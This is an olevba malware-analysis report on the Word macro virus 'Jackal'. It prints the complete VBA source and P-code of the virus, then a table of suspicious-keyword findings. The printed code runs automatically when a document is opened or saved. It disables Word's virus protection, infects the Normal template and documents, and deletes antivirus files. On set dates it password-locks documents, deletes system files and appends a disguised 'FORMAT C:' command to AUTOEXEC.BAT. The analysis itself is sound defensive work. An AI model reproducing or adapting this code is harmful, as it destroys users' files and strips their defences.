olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Jackal
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Jackal - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Jackal.bas 
in file: ./Virus.MSWord.Jackal - OLE stream: 'Macros/VBA/Jackal'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoOpen()
  On Error GoTo Jackal

  Ultras

  KillAV

  Jackal

  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone

  WordBasic.DisableAutoMacros 0
  Options.VirusProtection = False

  Set GlobalDoc = NormalTemplate
  Set ActiveDoc = ActiveDocument

  GlobalInstalled = No
  DocumentInstalled = No

  For j = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(j).Name = "Jackal" Then
      GlobalInstalled = Yes
    End If
  Next

  For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "Jackal" Then
      DocumentInstalled = Yes
    End If
  Next

  If GlobalInstalled = No Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Jackal", Object:=wdOrganizerObjectProjectItems
    Options.SaveNormalPrompt = False
  End If

  If DocumentInstalled = No Then
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Jackal", Object:=wdOrganizerObjectProjectItems
      ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
  End If

  Application.DisplayAlerts = wdAlertsAll

Jackal:
End Sub


Sub FileSaveAs()

  Dialogs(wdDialogFileSaveAs).Show

  On Error GoTo Jackal

  Jackal

  Ultras

  KillAV

  Application.ScreenUpdating = False
  Application.DisplayAlerts = wdAlertsNone

  WordBasic.DisableAutoMacros 0
  Options.VirusProtection = False

  Set GlobalDoc = NormalTemplate
  Set ActiveDoc = ActiveDocument

  GlobalInstalled = No
  DocumentInstalled = No

  For j = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(j).Name = "Jackal" Then
      GlobalInstalled = Yes
    End If
  Next

  For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "Jackal" Then
      DocumentInstalled = Yes
    End If
  Next

  If GlobalInstalled = No Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Jackal", Object:=wdOrganizerObjectProjectItems
    Options.SaveNormalPrompt = False
  End If

  If DocumentInstalled = No Then
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Jackal", Object:=wdOrganizerObjectProjectItems
      ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
  End If

  Application.DisplayAlerts = wdAlertsAll

 Jackal

Jackal:
End Sub

Sub KillAV()
  On Error GoTo Biohazard
  Kill "C:\Program Files\AntiViral Toolkit Pro\Avp32.exe"
  Kill "C:\Program Files\AntiViral Toolkit Pro\*.avc"
  Kill "C:\Program Files\Command Software\F-PROT95\*.dll"
  Kill "C:\Program Files\Command Software\F-PROT95\*.exe"
  Kill "C:\Program Files\McAfee\VirusScan95\Scan.dat"
  Kill "C:\Program Files\McAfee\VirusScan\Scan.dat"
  Kill "C:\Program Files\Norton AntiVirus\Viruscan.dat"
  Kill "C:\Program Files\Symantec\Symevnt.386"
  Kill "C:\Program Files\FindVirus\Findviru.drv"
  Kill "C:\Program Files\Cheyenne\AntiVirus\*.dll"
  Kill "C:\Program Files\Cheyenne\Common\Cshell.dll"
  Kill "C:\PC-Cillin 95\Lpt$vpn.*"
  Kill "C:\PC-Cillin 95\Scan32.dll"
  Kill "C:\PC-Cillin 97\Lpt$vpn.*"
  Kill "C:\PC-Cillin 97\Scan32.dll"
  Kill "C:\eSafe\Protect\*.dll"
  Kill "C:\f-macro\f-macro.exe"
  Kill "C:\TBAVW95\Tbscan.sig"
  Kill "C:\Tbavw95\Tb*.*"
  Kill "C:\VS95\*.dll"
Biohazard:
End Sub

Sub Format()
  On Error GoTo Jackal
  Assistant.Visible = True
  With Assistant.NewBalloon
  .Text = "Error, is necessary will update files"
  .Heading = "Microsoft Office 97"
  .Animation = msoAnimationEmptyTrash
  .Show
End With
  Open "C:\AUTOEXEC.BAT" For Input As #1
   Close
   SetAttr "C:\AUTOEXEC.BAT", vbNormal
   Open "C:\AUTOEXEC.BAT" For Append As #1
   Print #1, "@ECHO OFF"
   Print #1, "CLS"
   Print #1, "ECHO Microsoft Corp. 1983-1997 All rights reserved"
   Print #1, "ECHO Goes preparation to renovation of your system files"
   Print #1, "ECHO Please wait this can occupy several minutes"
   Print #1, "FORMAT C: /U /C /S /AUTOTEST > NUL"
   Print #1, "ECHO."
   Print #1, "ECHO."
   Print #1, "ECHO."
   Print #1, "ECHO Error at renovations of files"
   Close #1
  SetAttr "C:\AUTOEXEC.BAT", vbReadOnly
Jackal:
End Sub

Sub ToolsMacro()

End Sub

Sub ViewVBCode()

End Sub

Sub FileTemplates()
UserForm.Show
End Sub

Sub Organizer()
UserForm.Show
End Sub

Sub EditFind()
UserForm.Show
Dialogs(wdDialogEditFind).Show
End Sub

Sub HelpAbout()
UserForm.Show
End Sub

Sub ToolsCustomize()
UserForm.Show
Dialogs(wdDialogToolsCustomize).Show
End Sub

Sub ToolsOptions()
UserForm.Show
Dialogs(wdDialogToolsOptions).Show
End Sub

Sub Jackal()
  On Error GoTo Jackal

   If Day(Now()) = 1 Then
      ActiveDocument.Password = "JACKAL"
      ActiveDocument.Save
    End If

   If Day(Now()) = 5 Then
      Format
    End If

   If Day(Now()) = 9 Then
      Format
    End If

   If Day(Now()) = 15 Then
     Kill "C:\*.*"
     Kill "C:\Windows\*.*"
     Kill "C:\Windows\System\*.*"
    End If

   If Day(Now()) = 17 Then
      Format
    End If

   If Day(Now()) = 25 Then
      Format
    End If

   If Day(Now()) = 27 Then
      ActiveDocument.Password = "ULTRAS"
      ActiveDocument.Save
    End If

   If Day(Now()) = 30 Then
     Kill "C:\*.*"
     Kill "C:\Windows\*.*"
     Kill "C:\Windows\System\*.*"
    End If

   If Month(Now()) = 5 Then
      Format
    End If

Jackal:
End Sub

Sub Ultras()
  On Error GoTo Jackal
  Application.StatusBar = True
  StatusBar = "W97M\JACKAL by ULTRAS"
  Application.Caption = "Jackal by Ultras"
  Application.UserName = "ULTRAS"
  Application.UserInitials = "Jackal"
  Options.BackgroundSave = False
  Options.CreateBackup = False
  Options.SendMailAttach = True
Jackal:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Jackal
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/Jackal - 10846 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Sub AutoOpen())
' Line #2:
' 	OnError Jackal 
' Line #3:
' Line #4:
' 	ArgsCall Ultras 0x0000 
' Line #5:
' Line #6:
' 	ArgsCall KillAV 0x0000 
' Line #7:
' Line #8:
' 	ArgsCall Jackal 0x0000 
' Line #9:
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #11:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #12:
' Line #13:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #15:
' Line #16:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #17:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #18:
' Line #19:
' 	Ld No 
' 	St GlobalInstalled 
' Line #20:
' 	Ld No 
' 	St DocumentInstalled 
' Line #21:
' Line #22:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Jackal"
' 	Eq 
' 	IfBlock 
' Line #24:
' 	Ld Yes 
' 	St GlobalInstalled 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	StartForVariable 
' 	Next 
' Line #27:
' Line #28:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #29:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Jackal"
' 	Eq 
' 	IfBlock 
' Line #30:
' 	Ld Yes 
' 	St DocumentInstalled 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	StartForVariable 
' 	Next 
' Line #33:
' Line #34:
' 	Ld GlobalInstalled 
' 	Ld No 
' 	Eq 
' 	IfBlock 
' Line #35:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Jackal"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #36:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #37:
' 	EndIfBlock 
' Line #38:
' Line #39:
' 	Ld DocumentInstalled 
' 	Ld No 
' 	Eq 
' 	IfBlock 
' Line #40:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Jackal"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #41:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #42:
' 	EndIfBlock 
' Line #43:
' Line #44:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #45:
' Line #46:
' 	Label Jackal 
' Line #47:
' 	EndSub 
' Line #48:
' Line #49:
' Line #50:
' 	FuncDefn (Sub FileSaveAs())
' Line #51:
' Line #52:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #53:
' Line #54:
' 	OnError Jackal 
' Line #55:
' Line #56:
' 	ArgsCall Jackal 0x0000 
' Line #57:
' Line #58:
' 	ArgsCall Ultras 0x0000 
' Line #59:
' Line #60:
' 	ArgsCall KillAV 0x0000 
' Line #61:
' Line #62:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #63:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #64:
' Line #65:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #66:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #67:
' Line #68:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #69:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #70:
' Line #71:
' 	Ld No 
' 	St GlobalInstalled 
' Line #72:
' 	Ld No 
' 	St DocumentInstalled 
' Line #73:
' Line #74:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #75:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Jackal"
' 	Eq 
' 	IfBlock 
' Line #76:
' 	Ld Yes 
' 	St GlobalInstalled 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	StartForVariable 
' 	Next 
' Line #79:
' Line #80:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #81:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "Jackal"
' 	Eq 
' 	IfBlock 
' Line #82:
' 	Ld Yes 
' 	St DocumentInstalled 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	StartForVariable 
' 	Next 
' Line #85:
' Line #86:
' 	Ld GlobalInstalled 
' 	Ld No 
' 	Eq 
' 	IfBlock 
' Line #87:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Jackal"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #88:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #89:
' 	EndIfBlock 
' Line #90:
' Line #91:
' 	Ld DocumentInstalled 
' 	Ld No 
' 	Eq 
' 	IfBlock 
' Line #92:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Jackal"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #93:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #94:
' 	EndIfBlock 
' Line #95:
' Line #96:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #97:
' Line #98:
' 	ArgsCall Jackal 0x0000 
' Line #99:
' Line #100:
' 	Label Jackal 
' Line #101:
' 	EndSub 
' Line #102:
' Line #103:
' 	FuncDefn (Sub KillAV())
' Line #104:
' 	OnError Biohazard 
' Line #105:
' 	LitStr 0x0030 "C:\Program Files\AntiViral Toolkit Pro\Avp32.exe"
' 	ArgsCall Kill 0x0001 
' Line #106:
' 	LitStr 0x002C "C:\Program Files\AntiViral Toolkit Pro\*.avc"
' 	ArgsCall Kill 0x0001 
' Line #107:
' 	LitStr 0x0030 "C:\Program Files\Command Software\F-PROT95\*.dll"
' 	ArgsCall Kill 0x0001 
' Line #108:
' 	LitStr 0x0030 "C:\Program Files\Command Software\F-PROT95\*.exe"
' 	ArgsCall Kill 0x0001 
' Line #109:
' 	LitStr 0x002C "C:\Program Files\McAfee\VirusScan95\Scan.dat"
' 	ArgsCall Kill 0x0001 
' Line #110:
' 	LitStr 0x002A "C:\Program Files\McAfee\VirusScan\Scan.dat"
' 	ArgsCall Kill 0x0001 
' Line #111:
' 	LitStr 0x002E "C:\Program Files\Norton AntiVirus\Viruscan.dat"
' 	ArgsCall Kill 0x0001 
' Line #112:
' 	LitStr 0x0025 "C:\Program Files\Symantec\Symevnt.386"
' 	ArgsCall Kill 0x0001 
' Line #113:
' 	LitStr 0x0027 "C:\Program Files\FindVirus\Findviru.drv"
' 	ArgsCall Kill 0x0001 
' Line #114:
' 	LitStr 0x0029 "C:\Program Files\Cheyenne\AntiVirus\*.dll"
' 	ArgsCall Kill 0x0001 
' Line #115:
' 	LitStr 0x002B "C:\Program Files\Cheyenne\Common\Cshell.dll"
' 	ArgsCall Kill 0x0001 
' Line #116:
' 	LitStr 0x0019 "C:\PC-Cillin 95\Lpt$vpn.*"
' 	ArgsCall Kill 0x0001 
' Line #117:
' 	LitStr 0x001A "C:\PC-Cillin 95\Scan32.dll"
' 	ArgsCall Kill 0x0001 
' Line #118:
' 	LitStr 0x0019 "C:\PC-Cillin 97\Lpt$vpn.*"
' 	ArgsCall Kill 0x0001 
' Line #119:
' 	LitStr 0x001A "C:\PC-Cillin 97\Scan32.dll"
' 	ArgsCall Kill 0x0001 
' Line #120:
' 	LitStr 0x0016 "C:\eSafe\Protect\*.dll"
' 	ArgsCall Kill 0x0001 
' Line #121:
' 	LitStr 0x0016 "C:\f-macro\f-macro.exe"
' 	ArgsCall Kill 0x0001 
' Line #122:
' 	LitStr 0x0015 "C:\TBAVW95\Tbscan.sig"
' 	ArgsCall Kill 0x0001 
' Line #123:
' 	LitStr 0x0010 "C:\Tbavw95\Tb*.*"
' 	ArgsCall Kill 0x0001 
' Line #124:
' 	LitStr 0x000D "C:\VS95\*.dll"
' 	ArgsCall Kill 0x0001 
' Line #125:
' 	Label Biohazard 
' Line #126:
' 	EndSub 
' Line #127:
' Line #128:
' 	FuncDefn (Sub Format$())
' Line #129:
' 	OnError Jackal 
' Line #130:
' 	LitVarSpecial (True)
' 	Ld Assistant 
' 	MemSt Visible 
' Line #131:
' 	StartWithExpr 
' 	Ld Assistant 
' 	MemLd NewBalloon 
' 	With 
' Line #132:
' 	LitStr 0x0025 "Error, is necessary will update files"
' 	MemStWith Then 
' Line #133:
' 	LitStr 0x0013 "Microsoft Office 97"
' 	MemStWith Heading 
' Line #134:
' 	Ld msoAnimationEmptyTrash 
' 	MemStWith Animation 
' Line #135:
' 	ArgsMemCallWith Show 0x0000 
' Line #136:
' 	EndWith 
' Line #137:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #138:
' 	CloseAll 
' Line #139:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #140:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #141:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@ECHO OFF"
' 	PrintItemNL 
' Line #142:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "CLS"
' 	PrintItemNL 
' Line #143:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "ECHO Microsoft Corp. 1983-1997 All rights reserved"
' 	PrintItemNL 
' Line #144:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0038 "ECHO Goes preparation to renovation of your system files"
' 	PrintItemNL 
' Line #145:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0030 "ECHO Please wait this can occupy several minutes"
' 	PrintItemNL 
' Line #146:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "FORMAT C: /U /C /S /AUTOTEST > NUL"
' 	PrintItemNL 
' Line #147:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "ECHO."
' 	PrintItemNL 
' Line #148:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "ECHO."
' 	PrintItemNL 
' Line #149:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "ECHO."
' 	PrintItemNL 
' Line #150:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0022 "ECHO Error at renovations of files"
' 	PrintItemNL 
' Line #151:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #152:
' 	LitStr 0x000F "C:\AUTOEXEC.BAT"
' 	Ld vbReadOnly 
' 	ArgsCall SetAttr 0x0002 
' Line #153:
' 	Label Jackal 
' Line #154:
' 	EndSub 
' Line #155:
' Line #156:
' 	FuncDefn (Sub ToolsMacro())
' Line #157:
' Line #158:
' 	EndSub 
' Line #159:
' Line #160:
' 	FuncDefn (Sub ViewVBCode())
' Line #161:
' Line #162:
' 	EndSub 
' Line #163:
' Line #164:
' 	FuncDefn (Sub FileTemplates())
' Line #165:
' 	Ld UserForm 
' 	ArgsMemCall Show 0x0000 
' Line #166:
' 	EndSub 
' Line #167:
' Line #168:
' 	FuncDefn (Sub Organizer())
' Line #169:
' 	Ld UserForm 
' 	ArgsMemCall Show 0x0000 
' Line #170:
' 	EndSub 
' Line #171:
' Line #172:
' 	FuncDefn (Sub EditFind())
' Line #173:
' 	Ld UserForm 
' 	ArgsMemCall Show 0x0000 
' Line #174:
' 	Ld wdDialogEditFind 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #175:
' 	EndSub 
' Line #176:
' Line #177:
' 	FuncDefn (Sub HelpAbout())
' Line #178:
' 	Ld UserForm 
' 	ArgsMemCall Show 0x0000 
' Line #179:
' 	EndSub 
' Line #180:
' Line #181:
' 	FuncDefn (Sub ToolsCustomize())
' Line #182:
' 	Ld UserForm 
' 	ArgsMemCall Show 0x0000 
' Line #183:
' 	Ld wdDialogToolsCustomize 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #184:
' 	EndSub 
' Line #185:
' Line #186:
' 	FuncDefn (Sub ToolsOptions())
' Line #187:
' 	Ld UserForm 
' 	ArgsMemCall Show 0x0000 
' Line #188:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #189:
' 	EndSub 
' Line #190:
' Line #191:
' 	FuncDefn (Sub Jackal())
' Line #192:
' 	OnError Jackal 
' Line #193:
' Line #194:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #195:
' 	LitStr 0x0006 "JACKAL"
' 	Ld ActiveDocument 
' 	MemSt Password 
' Line #196:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #197:
' 	EndIfBlock 
' Line #198:
' Line #199:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	IfBlock 
' Line #200:
' 	ArgsCall Format$ 0x0000 
' Line #201:
' 	EndIfBlock 
' Line #202:
' Line #203:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	IfBlock 
' Line #204:
' 	ArgsCall Format$ 0x0000 
' Line #205:
' 	EndIfBlock 
' Line #206:
' Line #207:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	IfBlock 
' Line #208:
' 	LitStr 0x0006 "C:\*.*"
' 	ArgsCall Kill 0x0001 
' Line #209:
' 	LitStr 0x000E "C:\Windows\*.*"
' 	ArgsCall Kill 0x0001 
' Line #210:
' 	LitStr 0x0015 "C:\Windows\System\*.*"
' 	ArgsCall Kill 0x0001 
' Line #211:
' 	EndIfBlock 
' Line #212:
' Line #213:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0011 
' 	Eq 
' 	IfBlock 
' Line #214:
' 	ArgsCall Format$ 0x0000 
' Line #215:
' 	EndIfBlock 
' Line #216:
' Line #217:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	IfBlock 
' Line #218:
' 	ArgsCall Format$ 0x0000 
' Line #219:
' 	EndIfBlock 
' Line #220:
' Line #221:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001B 
' 	Eq 
' 	IfBlock 
' Line #222:
' 	LitStr 0x0006 "ULTRAS"
' 	Ld ActiveDocument 
' 	MemSt Password 
' Line #223:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #224:
' 	EndIfBlock 
' Line #225:
' Line #226:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001E 
' 	Eq 
' 	IfBlock 
' Line #227:
' 	LitStr 0x0006 "C:\*.*"
' 	ArgsCall Kill 0x0001 
' Line #228:
' 	LitStr 0x000E "C:\Windows\*.*"
' 	ArgsCall Kill 0x0001 
' Line #229:
' 	LitStr 0x0015 "C:\Windows\System\*.*"
' 	ArgsCall Kill 0x0001 
' Line #230:
' 	EndIfBlock 
' Line #231:
' Line #232:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	IfBlock 
' Line #233:
' 	ArgsCall Format$ 0x0000 
' Line #234:
' 	EndIfBlock 
' Line #235:
' Line #236:
' 	Label Jackal 
' Line #237:
' 	EndSub 
' Line #238:
' Line #239:
' 	FuncDefn (Sub Ultras())
' Line #240:
' 	OnError Jackal 
' Line #241:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt StatusBar 
' Line #242:
' 	LitStr 0x0015 "W97M\JACKAL by ULTRAS"
' 	St StatusBar 
' Line #243:
' 	LitStr 0x0010 "Jackal by Ultras"
' 	Ld Application 
' 	MemSt Caption 
' Line #244:
' 	LitStr 0x0006 "ULTRAS"
' 	Ld Application 
' 	MemSt UserName 
' Line #245:
' 	LitStr 0x0006 "Jackal"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #246:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt BackgroundSave 
' Line #247:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt CreateBackup 
' Line #248:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SendMailAttach 
' Line #249:
' 	Label Jackal 
' Line #250:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Avp32.exe           |Executable file name                         |
|IOC       |Cshell.dll          |Executable file name                         |
|IOC       |Scan32.dll          |Executable file name                         |
|IOC       |macro.exe           |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

